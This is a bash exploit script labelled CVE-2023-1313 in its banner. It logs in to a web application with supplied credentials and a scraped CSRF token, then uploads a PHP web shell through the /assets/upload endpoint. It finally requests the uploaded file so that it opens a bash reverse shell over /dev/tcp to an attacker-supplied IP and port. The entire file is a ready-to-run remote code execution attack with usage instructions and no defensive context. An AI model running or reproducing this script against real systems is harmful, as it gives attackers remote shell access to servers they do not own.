#!/bin/bash

target_url=$1
username=$2
password=$3
local_ip=$4
local_port=$5

banner=$(cat << 'EOF'
_____________   _______________         _______________   ________  ________           ____________  ____________  
\_   ___ \   \ /   /\_   _____/         \_____  \   _  \  \_____  \ \_____  \         /_   \_____  \/_   \_____  \ 
/    \  \/\   Y   /  |    __)_   ______  /  ____/  /_\  \  /  ____/   _(__  <   ______ |   | _(__  < |   | _(__  < 
\     \____\     /   |        \ /_____/ /       \  \_/   \/       \  /       \ /_____/ |   |/       \|   |/       \
 \______  / \___/   /_______  /         \_______ \_____  /\_______ \/______  /         |___/______  /|___/______  /
        \/                  \/                  \/     \/         \/       \/                     \/            \/ 
EOF
)

if [ $# -ne 5 ]; then
    echo "$banner"
    echo "Usage: $0 <TARGET_URL> <USERNAME> <PASSWORD>  <LOCAL_IP> <LOCAL_PORT>"
    exit 1
fi

csrf=$(curl -s "$target_url/auth/login" | grep -i csrf | awk -F'"' '{print $2}')

login_request=$(curl --path-as-is -i -s -k -X 'POST' \
    -H 'Content-Type: application/json; charset=UTF-8' \
    --data-binary "{\"auth\":{\"user\":\"$username\",\"password\":\"$password\"},\"csrf\":\"$csrf\"}" \
    "$target_url/auth/check" \
    2>/dev/null)

cookie=$(echo "$login_request" | grep -i 'Set-Cookie' | awk '{print $2}' | sed 's/;$//')

if [ -n "$cookie" ]; then
    echo -e "[+] Successfully Logged in!"
else
    echo -e "[-] Login Failure"
    exit 1
fi

shell=$(echo -e "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$local_ip/$local_port 0>&1'\"); ?>" > /tmp/shell.php)

upload_file=$(curl --path-as-is -s -k -X POST \
    -b "$cookie" \
    -F 'folder=' \
    -F 'files[]=@/tmp/shell.php;type=application/x-php' \
    "$target_url/assets/upload" 2>/dev/null | jq .)

check_success=$(echo $upload_file | jq -r .uploaded.[])

shell_path=$(echo $upload_file | jq -r .assets.[].path)

if [ "$check_success" == "shell.php" ]; then
    echo -e "[+] Successfully Uploaded Shell!"
else
    echo -e "[-] Failed To Upload Shell."
    exit 1
fi

shell_url=$(echo $target_url/storage/uploads$shell_path)

echo -e "[+] Shell has been triggered at path $shell_url, check your listener!"

execute_shell=$(nohup curl -i -s -k \
    -b "$cookie" \
    "$shell_url" \
     2>/dev/null)

response_code=$(echo $execute_shell | head -n 1 | awk -F' ' '{print$2}')

if [ "$response_code" != "200" ]; then
    echo -e "[-] Failed to trigger shell, the server returned a $response_code status code"
fi